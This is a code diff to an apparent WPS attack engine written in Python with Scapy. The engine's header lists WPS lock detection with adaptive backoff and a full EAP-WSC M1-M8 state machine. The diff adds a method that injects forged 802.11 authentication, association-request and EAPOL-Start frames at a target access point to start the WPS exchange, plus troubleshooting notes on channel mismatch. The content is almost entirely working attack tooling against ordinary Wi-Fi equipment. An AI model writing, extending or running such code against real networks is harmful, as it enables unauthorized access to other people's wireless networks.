@@ -20,6 +20,16 @@ Key algorithms implemented:
   - WPS lock detection and adaptive backoff
   - Full EAP-WSC M1-M8 state machine with Scapy frame injection
 
+Association flow (required before EAP exchange):
+  The engine sends 802.11 Auth -> AssocReq (with WPS IE) -> EAPOL-Start before
+  waiting for EAP-Request/Identity. Without EAPOL-Start, the AP never initiates
+  the EAP exchange and the engine times out.
+
+Note: Some APs advertise a channel in their beacon frames but operate at a
+slightly different frequency (channel drift/mismatch). If scan reports ch3 but
+capture fails, try adjacent channels (ch4, ch2). Use `iw dev <iface> scan`
+to confirm the actual operating frequency of the AP.
+
 Dependencies (accepted external):
   - scapy: raw 802.11 frame injection and capture
   - wash: WPS scanner (part of reaver-suite, accepted exception)
@@ -751,6 +761,73 @@ class WscSession:
         )
         return captured[0] if captured else None
 
+    def _send_auth_assoc_eapol_start(self, channel: int = 0) -> bool:
+        """Send 802.11 Auth -> AssocReq -> EAPOL-Start to initiate EAP-WSC exchange.
+
+        Without this sequence the AP never sends EAP-Request/Identity and the
+        WPS engine waits indefinitely. Must be called before the first EAPOL sniff.
+
+        Note: Some APs advertise a channel in beacons but operate at a slightly
+        different frequency (channel drift/mismatch). If scan reports ch3 but
+        capture fails, try adjacent channels (ch4, ch2). Use
+        `iw dev <iface> scan` to confirm the actual AP operating frequency.
+
+        Args:
+            channel: AP channel for interface tuning before injection.
+                     Pass 0 (default) to skip channel switching.
+
+        Returns:
+            True if the sequence was sent without exceptions.
+        """
+        if not _SCAPY_OK:
+            return False
+        bssid = self.bssid
+        iface = self.iface
+        own_mac = self._src_mac
+        try:
+            if channel > 0:
+                subprocess.run(
+                    ["iw", iface, "set", "channel", str(channel)],
+                    capture_output=True,
+                    timeout=5,
+                )
+                time.sleep(0.1)
+
+            # 1. Auth frame (Open System Authentication)
+            auth_pkt = (
+                RadioTap()
+                / Dot11(addr1=bssid, addr2=own_mac, addr3=bssid, type=0, subtype=11)
+                / Dot11Auth(algo=0, seqnum=1, status=0)
+            )
+            sendp(auth_pkt, iface=iface, verbose=False, count=3, inter=0.05)
+            time.sleep(0.3)
+
+            # 2. AssocReq with minimal WPS IE (dd 09 00 50 f2 04 ...)
+            wps_ie = b"\xdd\x09\x00\x50\xf2\x04\x10\x4a\x00\x01\x10"
+            assoc_pkt = (
+                RadioTap()
+                / Dot11(addr1=bssid, addr2=own_mac, addr3=bssid, type=0, subtype=0)
+                / Dot11AssoReq(cap=0x0431, listen_interval=10)
+                / Dot11Elt(ID=0, info=b"")
+                / Dot11Elt(ID=1, info=b"\x82\x84")
+                / Raw(load=wps_ie)
+            )
+            sendp(assoc_pkt, iface=iface, verbose=False, count=3, inter=0.05)
+            time.sleep(0.3)
+
+            # 3. EAPOL-Start (type=1) triggers EAP-Request/Identity from the AP
+            eapol_start = (
+                RadioTap()
+                / Dot11(addr1=bssid, addr2=own_mac, addr3=bssid, type=2, subtype=8)
+                / EAPOL(version=1, type=1)
+            )
+            sendp(eapol_start, iface=iface, verbose=False, count=3, inter=0.05)
+            logger.debug("Auth+Assoc+EAPOL-Start sent to %s on %s", bssid, iface)
+            return True
+        except Exception as exc:
+            logger.warning("Failed to send Auth+Assoc+EAPOL-Start: %s", exc)
+            return False
+
     def _parse_wsc_msg(self, eap_frame: bytes) -> Optional[Tuple[int, int, bytes]]:
         """Parse an EAP-WSC frame and extract op_code and TLV payload.
 
@@ -810,6 +887,11 @@ class WscSession:
         self._capture.priv_key = priv_key
         self._capture.pke = pke
         self._capture.enrollee_nonce = enrollee_nonce
+
+        # Send 802.11 Auth + AssocReq + EAPOL-Start to trigger EAP-Request/Identity.
+        # Without this sequence the AP never initiates the EAP exchange.
+        self._send_auth_assoc_eapol_start()
+        time.sleep(0.2)
 
         # --- Step 1: Wait for EAP-Request/Identity from AP ---
         logger.debug("WSC: waiting for EAP-Request/Identity from AP")
